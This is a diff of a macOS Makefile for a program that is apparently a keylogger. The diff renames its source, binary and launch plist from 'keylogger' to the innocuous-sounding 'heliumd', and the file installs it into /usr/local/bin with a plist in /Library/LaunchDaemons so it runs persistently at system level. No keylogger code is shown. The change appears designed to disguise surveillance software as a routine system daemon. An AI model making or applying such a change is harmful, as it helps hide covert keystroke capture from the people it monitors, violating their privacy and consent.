@@ -1,8 +1,8 @@
 CC=gcc
 CFLAGS=-framework ApplicationServices -framework Carbon
-SOURCES=keylogger.c
-EXECUTABLE=keylogger
-PLIST=keylogger.plist
+SOURCES=heliumd.c
+EXECUTABLE=heliumd
+PLIST=heliumd.plist
 INSTALLDIR=/usr/local/bin
 PLISTDIR=/Library/LaunchDaemons
 PLISTFULL=$(PLISTDIR)/$(PLIST)
